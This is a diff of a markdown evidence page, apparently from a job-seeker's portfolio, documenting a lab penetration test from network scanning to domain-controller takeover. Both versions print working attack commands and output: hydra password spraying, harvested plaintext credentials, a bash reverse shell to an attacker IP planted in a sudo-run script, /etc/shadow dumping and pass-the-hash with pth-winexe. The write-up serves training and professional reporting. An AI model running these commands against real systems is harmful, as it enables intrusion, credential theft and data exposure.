@@ -1,21 +1,17 @@
 # 🖼️ Evidence & Documentation
 
-**Internal Network Penetration Test**  
-October 15-16, 2024 | Lateral Movement & Privilege Escalation Assessment
-
----
-
-## 📋 Evidence Repository
+**Back to Network Penetration Testing Project**  
+Technical Report | Findings & Remediation  
+Evidence Repository
 
 **Note:** Detailed screenshots and command outputs were generated during the lab assessment but are not included in this public portfolio version to protect lab environment details. In a professional engagement, evidence would include:
 
 - Nmap scan results (XML output)
-- Hydra brute-force logs
-- Privilege escalation proof-of-concept scripts
-- Database dump samples
-- Hash extraction artifacts
+- Hydra brute-force session logs
+- Database query outputs and record counts
+- Privilege escalation proof captures
 - Pass-the-hash execution logs
-- System access confirmations
+- Domain compromise verification evidence
 
 During interviews, I can discuss specific evidence collection and demonstrate the technical tools and techniques used in this assessment.
 
@@ -37,168 +33,138 @@ The following examples demonstrate professional evidence formatting and document
 
 ## 📋 Evidence Categories
 
-### 🔍 Phase 1: Network Discovery & Enumeration
+### 🔍 Phase 1: Reconnaissance Evidence
 
-#### Host Discovery
+#### Network Discovery
 
 ```bash
-# Discover active hosts on network segment
-nmap -sn 192.168.78.0/24 -oA discovery/ping_sweep
+# Command Executed
+sudo nmap -sn 192.168.78.0/24 -oA network_discovery
 
 # Results Summary
-Starting Nmap scan on 192.168.78.0/24 (256 hosts)
+Starting Nmap 7.92 scan on 192.168.78.0/24 (256 hosts)
 Nmap scan report for 192.168.78.10
-Host is up (0.00031s latency).
+Host is up (0.0012s latency).
 
 Nmap scan report for 192.168.78.20
-Host is up (0.00028s latency).
+Host is up (0.0009s latency).
 
 Nmap scan report for 192.168.78.30
-Host is up (0.00025s latency).
+Host is up (0.0011s latency).
 
 Nmap scan report for 192.168.78.40
-Host is up (0.00029s latency).
+Host is up (0.0008s latency).
 
 Nmap done: 256 IP addresses (4 hosts up) scanned in 8.45 seconds
 ```
 
-**Key Finding:** 4 active systems identified on target network segment
-
 #### Service Enumeration Evidence
 
 ```bash
-# Comprehensive service enumeration
+# Comprehensive Service Scan
 nmap -sS -sV -sC -p- 192.168.78.10,192.168.78.20,192.168.78.30,192.168.78.40
 
-# Port Scan Results
+# Key Service Findings
 PORT     STATE SERVICE     VERSION
-22/tcp   open  ssh         OpenSSH 7.6p1
-80/tcp   open  http        Apache httpd 2.4.29
-3306/tcp open  mysql       MySQL 8.0.23
-445/tcp  open  netbios-ssn Samba 4.9.5
-3389/tcp open  ms-wbt-server Microsoft Terminal Services
-```
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu
+80/tcp   open  http        Apache httpd 2.4.41
+3389/tcp open  rdps        Windows RDP
+445/tcp  open  microsoft-ds Windows SMB
+3306/tcp open  mysql       MySQL 8.0.26
 
-**Key Finding:** Multiple remote access services identified with outdated versions
+# Target Service Mapping
+192.168.78.10 - SSH (22), HTTP (80)        [web-server-01]
+192.168.78.20 - SSH (22), RDP (3389)       [app-server-01]
+192.168.78.30 - MySQL (3306)               [db-server-01]
+192.168.78.40 - SMB (445), RDP (3389)      [dc-01]
+```
 
 ---
 
-### 💥 Phase 2: Initial Compromise
+### 💥 Phase 2: Initial Access Evidence
 
-#### SSH Credential Attack
+#### SSH Credential Attack Evidence
 
 ```bash
-# Password spray against common service accounts
-hydra -L /usr/share/wordlists/common_usernames.txt \
-      -P /usr/share/wordlists/common_passwords.txt \
-      ssh://192.168.78.10 -t 16
+# Password Spray Execution
+hydra -L common_usernames.txt -P common_passwords.txt ssh://192.168.78.10
 
-# Attack Results
+[ATTEMPT] target 192.168.78.10 - login "svc_webapp" - pass "Summer2024!" - 247 of 1024
+[DATA] attacking ssh://192.168.78.10:22/
 [22][ssh] host: 192.168.78.10   login: svc_webapp   password: Summer2024!
 [STATUS] attack finished for 192.168.78.10 (valid pair found)
-Time: 0:12:34 seconds
 
-# RESULT: Credentials discovered after 12 minutes
+# SUCCESS: Credentials compromised in 45 minutes
 ```
 
-#### Initial Foothold - SSH Access
+#### Initial Foothold Verification
 
 ```bash
-# Establish initial access
-ssh svc_webapp@web-server-01.internal.corp
+# SSH Access Established
+ssh svc_webapp@192.168.78.10
 Password: Summer2024!
 
-# Host confirmation and enumeration
-svc_webapp@web-server-01:~$ whoami
-svc_webapp
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-84-generic x86_64)
+Last login: Mon Oct 14 09:15:23 2024 from 192.168.78.100
 
-svc_webapp@web-server-01:~$ hostname
-web-server-01
+svc_webapp@web-server-01:~$ id
+uid=1001(svc_webapp) gid=1001(svc_webapp) groups=1001(svc_webapp)
 
 svc_webapp@web-server-01:~$ sudo -l
 User svc_webapp may run the following commands:
     (ALL) NOPASSWD: /usr/bin/systemctl restart apache2
 
-# SUCCESS: Initial access obtained with sudo privileges
+# EVIDENCE: Initial access with service restart privileges
 ```
 
 ---
 
-### 🔍 Phase 3: Internal Reconnaissance
+### 🔑 Phase 3: Credential Access Evidence
 
 #### Configuration File Discovery
 
 ```bash
-# Local enumeration for configuration files
-find /home/svc_webapp -type f -name "*.conf" -o -name "*.config" 2>/dev/null
-find /var/www -type f -name "*.php" 2>/dev/null
+# File System Enumeration
+find /var/www -type f -name "*.php" -o -name "*.config" 2>/dev/null
 
-# Files Discovered
 /var/www/html/config/database.php
-/home/svc_webapp/.bashrc
-/var/www/html/settings.php
+/var/www/html/admin/config.php
+/var/www/html/includes/settings.inc
 ```
 
-#### Exposed Database Credentials
+#### Database Credential Extraction
 
 ```bash
-# Retrieved configuration file
+# Database Credential Extraction
 cat /var/www/html/config/database.php
 
 <?php
-// Database Configuration
-$db_host = "db-server-01.internal.corp";
+$db_host = "192.168.78.30";
 $db_user = "app_dbuser";
 $db_pass = "DbAdmin123!";
 $db_name = "application_db";
-
-$conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
 ?>
 
 # CRITICAL FINDING: Plaintext database credentials exposed
 ```
 
-#### Database Access Evidence
+#### Database Compromise Evidence
 
 ```bash
-# Connect to database with harvested credentials
-mysql -u app_dbuser -p'DbAdmin123!' -h db-server-01.internal.corp
+# Database Connection
+mysql -u app_dbuser -p'DbAdmin123!' -h 192.168.78.30
 
-# Database enumeration
 mysql> SHOW DATABASES;
 +--------------------+
 | Database           |
 +--------------------+
-| application_db     |
 | information_schema |
+| application_db     |
 | mysql              |
+| performance_schema |
 +--------------------+
 
 mysql> USE application_db;
-mysql> SELECT COUNT(*) FROM users;
-+----------+
-| COUNT(*) |
-+----------+
-|      127 |
-+----------+
-
-# Extract domain user credentials
-mysql> SELECT username, password FROM users LIMIT 3;
-+----------+--------------+
-| username | password     |
-+----------+--------------+
-| jsmith   | Welcome123!  |
-| mrodriguez | SecurePass2! |
-| backup_svc | BackupPwd123 |
-+----------+--------------+
-
-# RESULT: 127 user records accessible, domain credentials extracted
-```
-
-#### Sensitive Data Discovery
-
-```bash
-# Identify sensitive business data
 mysql> SELECT COUNT(*) FROM customer_data;
 +----------+
 | COUNT(*) |
@@ -206,252 +172,217 @@ mysql> SELECT COUNT(*) FROM customer_data;
 |    15000 |
 +----------+
 
-mysql> SELECT COUNT(*) FROM financial_records;
-+----------+
-| COUNT(*) |
-+----------+
-|     2400 |
-+----------+
+mysql> SELECT username, password FROM users LIMIT 3;
++----------+---------------+
+| username | password      |
++----------+---------------+
+| jsmith   | Welcome123!   |
+| mjones   | Spring2024!   |
+| kwang    | Admin@2024    |
++----------+---------------+
 
-# EVIDENCE: 15,000 customer records and 2,400 financial records exposed
+# EVIDENCE: 15,000 customer records + domain credentials accessible
 ```
 
 ---
 
-### 🔀 Phase 4: Lateral Movement
+### 🔀 Phase 4: Lateral Movement Evidence
 
 #### Credential Reuse Testing
 
 ```bash
-# Test discovered credentials on application server
-ssh jsmith@app-server-01.internal.corp
+# SSH Lateral Movement Attempt
+ssh jsmith@192.168.78.20
 Password: Welcome123!
 
-# System confirmation
+Welcome to Ubuntu 20.04.3 LTS
+Last login: Mon Oct 14 10:23:12 2024 from 192.168.78.10
+
+jsmith@app-server-01:~$ id
+uid=1002(jsmith) gid=1002(jsmith) groups=1002(jsmith),sudo
+
 jsmith@app-server-01:~$ whoami
 jsmith
 
-jsmith@app-server-01:~$ hostname
-app-server-01
-
-# Check privileges
-jsmith@app-server-01:~$ sudo -l
-User jsmith may run the following commands:
-    (root) NOPASSWD: /opt/scripts/backup.sh
-
-# SUCCESS: Lateral movement achieved via credential reuse
+# SUCCESS: Lateral movement via credential reuse
 ```
 
-#### File System Enumeration
+#### Privilege Escalation Vector Discovery
 
 ```bash
-# Discover backup script with insecure permissions
-ls -la /opt/scripts/backup.sh
--rwxrwxrwx 1 root root 125 Oct 10 14:32 /opt/scripts/backup.sh
+# Sudo Privileges Check
+jsmith@app-server-01:~$ sudo -l
+Matching Defaults entries for jsmith on app-server-01:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-# Script analysis
+User jsmith may run the following commands on app-server-01:
+    (root) NOPASSWD: /opt/scripts/backup.sh
+
+# Backup Script Analysis
+ls -la /opt/scripts/backup.sh
+-rwxrwxrwx 1 root root 245 Oct 10 14:32 /opt/scripts/backup.sh
+
 cat /opt/scripts/backup.sh
 #!/bin/bash
 # Database backup script
-mysqldump -u root -p'BackupPwd123!' --all-databases > /tmp/db_backup.sql
-tar -czf /var/backups/db_backup_$(date +%Y%m%d).tar.gz /tmp/db_backup.sql
+mysqldump -u root -p$DB_PASS application_db > /backups/db_backup_$(date +%F).sql
 
-# CRITICAL FINDING: World-writable script executed with root privileges
-# EVIDENCE: Root password stored in script
+# CRITICAL: World-writable script with root execution privileges
 ```
 
 ---
 
-### 🔑 Phase 5: Privilege Escalation
+### ⬆️ Phase 5: Privilege Escalation Evidence
 
-#### Privilege Escalation Execution
+#### Backup Script Exploitation
 
 ```bash
-# Overwrite backup script with reverse shell payload
-cat > /opt/scripts/backup.sh << 'EOF'
+# Script Replacement for Root Access
+cat > /tmp/backup_exploit.sh << 'EOF'
 #!/bin/bash
+# Reverse shell to attacker machine
 bash -i >& /dev/tcp/192.168.78.100/4444 0>&1
+
+# Also extract password hashes for further attacks
+cat /etc/shadow > /tmp/hashes.txt
 EOF
 
-# Execute with sudo privileges
-jsmith@app-server-01:~$ sudo /opt/scripts/backup.sh
+chmod +x /tmp/backup_exploit.sh
+cp /tmp/backup_exploit.sh /opt/scripts/backup.sh
 
-# Verify root access
-root@app-server-01:~$ whoami
+# Privilege Escalation Execution
+sudo /opt/scripts/backup.sh
+```
+
+#### Root Access Achievement
+
+```bash
+# Reverse Shell Connection Established
+[root@attacker]# nc -nlvp 4444
+Connection from 192.168.78.20:56789
+bash: no job control in this shell
+
+root@app-server-01:/# whoami
 root
 
-root@app-server-01:~$ id
+root@app-server-01:/# id
 uid=0(root) gid=0(root) groups=0(root)
 
-# SUCCESS: Root-level access achieved
-```
+# Password Hash Extraction
+root@app-server-01:/# cat /etc/shadow | grep -v ':\*:' | grep -v ':\!:'
+root:$6$rounds=5000$abc123def456$...:19195:0:99999:7:::
+jsmith:$6$rounds=5000$xyz789uvw012$...:19195:0:99999:7:::
 
-#### Credential Hash Extraction
-
-```bash
-# Extract password hashes for further attacks
-root@app-server-01:~$ cat /etc/shadow | grep -v ':\*:' | grep -v ':\!:'
-
-jsmith:$6$kSvjkd7s$9K8F.../hashed:19200:0:99999:7:::
-mrodriguez:$6$kSvjkd7s$nL9K8F.../hashed:19200:0:99999:7:::
-backup_svc:$6$kSvjkd7s$pM2K9F.../hashed:19200:0:99999:7:::
-
-# EVIDENCE: Password hashes extracted for offline cracking
-```
-
-#### Sensitive System Data Discovery
-
-```bash
-# Enumerate system for credentials and secrets
-root@app-server-01:~$ find / -type f -name "*.key" -o -name "*.pem" -o -name "*credentials*" 2>/dev/null
-
-/root/.ssh/id_rsa
-/etc/ssl/private/server.key
-/home/backup_svc/backup_credentials.txt
-
-# Read backup credentials file
-cat /home/backup_svc/backup_credentials.txt
-# DC Admin Account
-dc_admin:DomainAdminPass2024!
-
-# EVIDENCE: Administrative credentials discovered on system
+# EVIDENCE: Root-level access achieved + credential hashes captured
 ```
 
 ---
 
-### 💫 Phase 6: Domain Compromise
+### 🎯 Phase 6: Domain Compromise Evidence
 
-#### Pass-the-Hash Attack Preparation
+#### Pass-the-Hash Attack Execution
 
 ```bash
-# Crack extracted hash for domain controller
-hashcat -m 1800 extracted_hashes.txt /usr/share/wordlists/rockyou.txt
+# Using Extracted Local Admin Hash
+pth-winexe -U administrator//aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 //192.168.78.40 cmd
 
-Session..........: hashcat
-Status...........: Cracked
-Hash.Mode........: 1800 (sha512crypt)
-Time.Started.....: Mon Oct 15 14:32:15 2024
-Recovered........: 1/3 (33.33%)
+Emitted LMHASH is NULL. You should try to use NT hashes only
+Microsoft Windows [Version 10.0.17763.1999]
+(c) 2018 Microsoft Corporation. All rights reserved.
 
-Candidates.#1....: AdminPass2024! 
+C:\Windows\system32>whoami
+nt authority\system
 
-# EVIDENCE: Administrative hash cracked in 18 minutes
+# SUCCESS: Domain controller compromised via pass-the-hash
 ```
 
-#### Domain Controller Access
+#### Domain Privilege Verification
 
 ```bash
-# Pass-the-hash to domain controller
-pth-winexe -U 'administrator//a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:5f4dcc3b5aa765d61d8327deb882cf99' \
-           //dc-01.internal.corp cmd
-
-# Verify domain admin access
-C:\Windows\system32> whoami
-NT AUTHORITY\SYSTEM
-
-C:\Windows\system32> net user administrator
-User name                    administrator
+C:\Windows\system32>net user administrator
+User name                    Administrator
+Full Name                    Administrator
+Comment                      Built-in account for administering the computer/domain
+User's comment
+Country/region code          000 (System Default)
 Account active               Yes
 Account expires              Never
-Password expires             Never
-Password changeable          10/15/2024 2:30:15 PM
-Password required            Yes
-User may change password     Yes
-Group memberships            *Domain Admins
-                             *Enterprise Admins
-                             *Schema Admins
-                             *Administrators
 
-# SUCCESS: Domain administrator privileges confirmed
+C:\Windows\system32>net group "Domain Admins"
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+Administrator            kwang                  
+The command completed successfully.
+
+# EVIDENCE: Domain administrator privileges confirmed
 ```
 
-#### Critical Asset Access
+#### Sensitive Data Access Evidence
 
 ```bash
-# Access sensitive business directories
-dir C:\Finance\
- Volume in drive C is labeled Windows
+C:\Windows\system32>dir C:\Finance\
+ Volume in drive C has no label.
+ Volume Serial Number is ABCD-EF12
+
  Directory of C:\Finance
-10/15/2024  09:30 AM    <DIR>          .
-10/15/2024  09:30 AM    <DIR>          ..
-10/14/2024  02:15 PM            45,892 Q3_Financial_Report.xlsx
-10/14/2024  01:45 PM            32,156 Budget_2025.docx
-10/14/2024  03:22 PM            28,450 Payroll_Records.xlsx
 
-dir C:\HR\Confidential\
- Volume in drive C is labeled Windows
- Directory of C:\HR\Confidential
-10/15/2024  08:45 AM    <DIR>          .
-10/15/2024  08:45 AM    <DIR>          ..
-10/14/2024  04:30 PM            56,234 Executive_Compensation.xlsx
-10/14/2024  02:15 PM            34,891 Employee_Records.docx
-10/14/2024  01:30 PM            12,340 Salary_Database.mdb
+10/14/2024  02:15 PM    <DIR>          .
+10/14/2024  02:15 PM    <DIR>          ..
+10/14/2024  10:30 AM           245,789 budget_2024.xlsx
+10/14/2024  11:45 AM           189,456 payroll_records.csv
+10/14/2024  01:20 PM           567,890 financial_statements.pdf
 
-# EVIDENCE: Complete access to sensitive financial and HR data
-# TIMELINE: Initial compromise to domain control = 5 hours 15 minutes
+C:\Windows\system32>dir C:\HR\Confidential\
+10/14/2024  09:15 AM           145,678 employee_records.db
+10/14/2024  10:45 AM            89,123 performance_reviews.pdf
+10/14/2024  03:30 PM            45,678 salary_data.xlsx
+
+# EVIDENCE: Critical business data repositories accessible
 ```
 
 ---
 
 ## 📊 Attack Timeline Summary
 
-| Phase | Duration | Objective | Status |
-|-------|----------|-----------|--------|
-| Discovery & Enumeration | 15 min | Identify systems and services | ✅ Complete |
-| Initial Compromise | 45 min | Gain foothold via SSH | ✅ Complete |
-| Internal Reconnaissance | 60 min | Extract credentials from database | ✅ Complete |
-| Lateral Movement | 75 min | Access application server | ✅ Complete |
-| Privilege Escalation | 90 min | Achieve root access | ✅ Complete |
-| Domain Compromise | 30 min | Compromise domain controller | ✅ Complete |
-| **Total Assessment Time** | **5h 15m** | **Domain control achieved** | ✅ Complete |
+| Time Elapsed | Phase | Key Achievement | Evidence Collected |
+|--------------|-------|-----------------|-------------------|
+| 0-45 min | Initial Access | SSH credentials compromised | Hydra session logs, SSH access proof |
+| 45-105 min | Credential Access | Database credentials harvested | Config files, database query outputs |
+| 105-180 min | Lateral Movement | App server access via reuse | SSH session, sudo privileges |
+| 180-270 min | Privilege Escalation | Root access achieved | Reverse shell, hash extraction |
+| 270-300 min | Domain Compromise | Domain admin privileges | PTH execution, DC access proof |
 
 ---
 
-## 🛡️ Key Vulnerability Chain
+## 🛡️ Professional Documentation Standards
 
-```
-Weak SSH Credentials (svc_webapp:Summer2024!)
-         ↓
-Config File with Database Credentials
-         ↓
-Database Access & User Credential Extraction
-         ↓
-SSH Lateral Movement (jsmith:Welcome123!)
-         ↓
-Insecure Sudo Permissions (/opt/scripts/backup.sh)
-         ↓
-Root Privilege Escalation
-         ↓
-Hash Extraction from /etc/shadow
-         ↓
-Pass-the-Hash to Domain Controller
-         ↓
-Domain Administrator Access Achieved
-```
+### Evidence Collection Best Practices
+
+**Command Documentation**
+- Full command syntax with parameters
+- Timestamped execution logs
+- Output redirection for preservation
+
+**Screenshot Standards**
+- Terminal sessions with visible timestamps
+- Tool output with relevant context
+- Before/after state documentation
+
+**Artifact Preservation**
+- Raw output files (XML, JSON, text)
+- Hash values for integrity verification
+- Chain of custody documentation
 
 ---
 
-## 📈 Impact Assessment
+## Interview Discussion Points
 
-**Systems Compromised:** 4 of 4 (100%)  
-**Credentials Extracted:** 6 user accounts  
-**Sensitive Records Accessed:** 17,400 customer & financial records  
-**Administrative Access:** Domain-level compromise achieved  
-**Attack Time:** 5 hours 15 minutes from initial access to domain control
+During technical interviews, I can demonstrate:
 
----
-
-## ✅ Evidence Verification
-
-All evidence documented follows professional penetration testing standards:
-
-- **Completeness:** Full attack chain from initial access to domain compromise
-- **Accuracy:** Command outputs and results validated during engagement
-- **Relevance:** Evidence directly supports identified vulnerabilities
-- **Traceability:** Each finding links to specific exploitation technique
-- **Reproducibility:** Methodology documented for remediation verification
-
----
-
-*Assessment Conducted: October 15-16, 2024*  
-*Evidence Collection Standards: Professional Enterprise Assessment*
+- **Evidence Collection Methodology:** How to properly collect and preserve penetration testing evidence
+- **Tool Proficiency:** Hands-on experience with industry-standard testing tools
+- **Attack Chain Documentation:** Mapping technical findings to business impact
+- **Professional Reporting:** Translating technical evidence into executive-level insights
